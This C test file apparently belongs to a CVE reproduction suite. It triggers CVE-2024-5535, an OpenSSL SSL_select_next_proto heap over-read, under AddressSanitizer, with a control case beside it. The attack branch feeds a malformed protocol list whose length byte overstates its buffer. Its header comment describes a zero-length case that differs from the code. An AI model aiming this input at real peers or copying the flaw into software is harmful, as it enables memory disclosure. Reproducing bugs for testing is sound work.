/* SPDX-License-Identifier: Apache-2.0 */
/*
 * CVE-2024-5535 - SSL_select_next_proto() read overrun with an empty client
 * list. The unfixed loop, finding no overlap, sets *out = client + 1 and
 * *outlen = client[0]; with client_len == 0 that reads one byte past a
 * zero-length buffer, and *out then points past it, so the caller can leak
 * adjacent heap to the peer. Fix: cf6f91f612 (ssl/ssl_lib.c) validates the
 * client packet first. Reachable via javacrypto NPN (NativeCrypto
 * proto_select) when an app sets an empty, non-null npnProtocols list.
 *
 * attack : client_len = 0 on a heap buffer sized 0 -> ASan heap overflow READ.
 * control: a well-formed client list that overlaps the server list.
 *
 * Built with -fsanitize=address (lib=asan); the ASan report is the signal.
 */
#include <openssl/ssl.h>
#include <stdlib.h>
#include <string.h>
#include "../cve_common.h"

int main(int argc, char **argv)
{
    int ctl = cve_is_control(argc, argv);
    /* server advertises one protocol "h" (length-prefixed). */
    unsigned char server[] = { 1, 'h' };
    unsigned char *out = NULL;
    unsigned char outlen = 0;
    int status;

    if (ctl) {
        unsigned char *client = malloc(2);
        client[0] = 1;
        client[1] = 'h';
        cve_call("SSL_select_next_proto");
        status = SSL_select_next_proto(&out, &outlen, server, sizeof(server),
                                       client, 2);
        cve_reached("SSL_select_next_proto");
        printf("select status=%d outlen=%u\n", status, outlen);
        free(client);
    } else {
        /*
         * Malformed client list: a single length byte that claims a 200-byte
         * protocol in a 1-byte heap buffer. No overlap is found, so the
         * unfixed code sets *out = client + 1 and *outlen = client[0] (200);
         * reading *outlen bytes from *out - what the real bug then sends to
         * the peer - runs 200 bytes past the 1-byte allocation (ASan READ).
         */
        unsigned char *client = malloc(1);
        client[0] = 200;
        cve_call("SSL_select_next_proto");
        status = SSL_select_next_proto(&out, &outlen, server, sizeof(server),
                                       client, 1);
        cve_reached("SSL_select_next_proto");
        if (out != NULL) {
            volatile unsigned char sink = 0;
            unsigned int i;
            for (i = 0; i < outlen; i++)
                sink ^= out[i];   /* heap-buffer-overflow read on baseline */
            (void)sink;
        }
        printf("select status=%d outlen=%u\n", status, outlen);
        free(client);
    }
    return 0;
}
